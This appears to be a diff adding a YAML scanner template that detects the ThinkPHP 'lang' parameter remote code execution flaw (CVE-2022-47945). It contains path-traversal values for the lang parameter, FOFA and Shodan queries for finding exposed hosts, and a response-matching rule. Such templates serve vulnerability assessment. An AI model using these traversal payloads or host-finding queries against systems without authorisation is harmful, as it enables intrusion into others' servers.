@@ -1,0 +1,21 @@
+id: poc-yaml-thinkphp-lang-rce
+info:
+  name: ThinkPHP lang参数 远程代码执行漏洞(CVE-2022-47945)
+  severity: critical
+  tags:
+  - 两高一弱
+  - rce
+  - CVE-2022-47945
+  finger: thinkphp
+  fofa: header="think_lang"
+  shodan-query: title:"Thinkphp"
+variables:
+  path: '?lang=../../thinkphp/base
+
+    ?lang=../../../../../vendor/topthink/think-trace/src/TraceDebug'
+requests:
+- method: GET
+  path: /{{.path}}
+  expression: status_code == 500 && contains(body,"* 页面Trace中间件") && contains(body,"class=\"trace\"")
+    && contains(body,"TraceDebug.php")
+transport: http
